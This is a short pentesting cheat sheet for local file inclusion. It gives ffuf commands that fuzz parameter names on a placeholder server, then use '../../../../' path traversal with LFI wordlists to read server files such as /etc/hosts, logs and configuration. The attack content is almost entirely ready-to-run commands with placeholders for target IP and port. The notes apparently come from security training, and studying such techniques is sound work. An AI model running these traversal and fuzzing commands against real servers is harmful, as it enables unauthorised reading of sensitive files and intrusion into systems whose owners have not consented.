
### fuzzing parameters to detect lfi injection points
```shell-session
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

## Server log/configs

start after u found the vuln and set the path to `/` before fuzzing eg (in this example ../../../ got me to root dir `/`, from here i can fuzz for files such as /etc/hosts etcetra via the wordlist 
`/tools/logs_lfi_windows.txt` for win
for linux:
`/tools/my-resources/logs_lfi_linux.txt`
and later on:`jhaddix`

```shell-session
 ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```
